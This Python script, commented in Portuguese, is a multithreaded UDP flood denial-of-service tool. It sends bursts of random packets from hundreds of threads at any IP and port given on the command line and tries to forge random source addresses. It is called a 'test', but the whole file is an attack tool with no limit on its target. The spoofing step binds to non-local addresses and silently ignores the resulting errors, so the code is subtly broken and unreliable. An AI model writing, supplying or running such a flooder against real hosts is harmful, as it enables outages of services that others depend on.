import socket
import random
import time
import sys
from concurrent.futures import ThreadPoolExecutor

# Configurações padrão
DEFAULT_THREADS = 500      # Número padrão de threads
DEFAULT_DURATION = 60      # Duração do teste em segundos
DEFAULT_PACKET_SIZE = 1024 # Tamanho padrão do pacote em bytes
LOG_INTERVAL = 5           # Intervalo em segundos para exibir logs

# Função para gerar pacotes aleatórios
def generate_packet(size):
    return random._urandom(size)

# Função para criar um socket com IP de origem personalizado
def create_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    return sock

# Função para enviar pacotes em alta velocidade
def send_packets(ip, port, duration, packet_size):
    start_time = time.time()
    sent = 0

    while time.time() - start_time < duration:
        try:
            sock = create_socket()
            
            # Configurar IP e porta de origem aleatórios
            spoofed_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
            spoofed_port = random.randint(1024, 65535)
            sock.bind((spoofed_ip, spoofed_port))
            
            # Gera e envia o pacote
            packet = generate_packet(packet_size)
            sock.sendto(packet, (ip, port))
            sent += 1

            # Introduz variação aleatória no envio
            if random.random() > 0.95:  # 5% de chance de pausar
                time.sleep(random.uniform(0.01, 0.1))

        except Exception:
            pass  # Ignora erros para manter o desempenho
        finally:
            sock.close()

    return sent

# Função principal
def main():
    if len(sys.argv) < 3:
        print("Uso: python script.py <IP> <PORTA> [THREADS] [DURAÇÃO] [TAMANHO_PACOTE]")
        sys.exit()

    ip = sys.argv[1]
    port = int(sys.argv[2])
    threads = int(sys.argv[3]) if len(sys.argv) > 3 else DEFAULT_THREADS
    duration = int(sys.argv[4]) if len(sys.argv) > 4 else DEFAULT_DURATION
    packet_size = int(sys.argv[5]) if len(sys.argv) > 5 else DEFAULT_PACKET_SIZE

    print(f"[INFO] Iniciando teste no IP: {ip}, Porta: {port}")
    print(f"[INFO] Threads: {threads}, Duração: {duration}s, Tamanho do Pacote: {packet_size} bytes")

    # Monitoramento e execução
    total_sent = 0
    try:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [
                executor.submit(send_packets, ip, port, duration, packet_size)
                for _ in range(threads)
            ]

            start_time = time.time()
            while time.time() - start_time < duration:
                time.sleep(LOG_INTERVAL)
                elapsed = int(time.time() - start_time)
                print(f"[INFO] Tempo decorrido: {elapsed}s, Total de pacotes enviados até agora: {total_sent}")

            # Finaliza os resultados
            for future in futures:
                total_sent += future.result()

    except KeyboardInterrupt:
        print("\n[INFO] Teste interrompido manualmente.")
    except Exception as e:
        print(f"[ERRO] Erro inesperado: {e}")
    finally:
        print(f"[INFO] Teste concluído. Total de pacotes enviados: {total_sent}")

if __name__ == "__main__":
    main()
